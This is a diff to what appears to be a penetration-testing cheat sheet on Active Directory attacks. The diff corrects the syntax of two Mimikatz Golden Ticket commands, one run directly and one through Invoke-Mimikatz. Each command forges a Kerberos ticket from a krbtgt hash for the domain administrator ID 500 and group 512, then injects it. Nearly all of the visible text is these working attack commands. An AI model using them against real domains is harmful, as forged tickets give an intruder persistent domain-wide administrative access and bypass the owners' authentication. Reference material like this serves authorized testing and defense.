@@ -176,7 +176,7 @@ Now back on attacker machine you use the NTLM of krbtgt account to create Golden
 kerberos::golden 
 /User:DonaldDuck /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
 538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
-id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
+/id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
 ```
 
 #### Silver
@@ -239,7 +239,7 @@ When invoking command make sure to wrap in double AND single quotes -
 Invoke-Mimikatz -Command '"kerberos::golden 
 /User:MickeyMouse /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
 538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
-id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+/id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
 #### Misc Attacks
